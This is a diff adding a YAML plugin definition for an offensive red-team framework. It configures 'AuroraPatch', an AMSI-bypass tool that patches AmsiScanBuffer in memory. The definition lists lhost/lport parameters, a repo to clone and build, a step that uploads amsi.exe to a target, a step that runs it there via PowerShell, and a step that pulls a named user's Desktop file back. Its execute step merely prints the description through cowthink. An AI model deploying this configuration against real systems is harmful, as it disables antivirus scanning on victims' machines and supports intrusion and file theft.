@@ -1,0 +1,24 @@
+name: AuroraPatch
+description: >
+  AuroraPatch is a lightweight, offensive Go tool that bypasses Windows AMSI (Anti-Malware Scan Interface) by patching the AmsiScanBuffer function in memory. Designed for red teamers and security researchers by LazyOwn RedTeam, it allows execution of scripts that would otherwise be blocked by Defender or other AMSI-integrated AVs.
+author: "LazyOwn RedTeam"
+version: "1.0"
+enabled: true
+params:
+  - name: lhost
+    type: string
+    required: true
+    description: lhost target.
+  - name: lport
+    type: string
+    required: true
+    description: lport to operate.
+tool:
+  name: AuroraPatch
+  repo_url: https://github.com/grisuno/amsi.git
+  install_path: external/.exploit/AuroraPatch
+  install_command: make windows
+  execute_command: cowthink -bdgpstwy 'AuroraPatch is a lightweight, offensive Go tool that bypasses Windows AMSI (Anti-Malware Scan Interface) by patching the AmsiScanBuffer function in memory. Designed for red teamers and security researchers by LazyOwn RedTeam, it allows execution of scripts that would otherwise be blocked by Defender or other AMSI-integrated AVs.'
+  upload_file: no_priv ./external/.exploit/AuroraPatch/amsi.exe
+  remote_command: no_priv powershell .\amsi.exe > output.txt
+  download_file: C:\Users\nathan.aadam\Desktop\user.txt
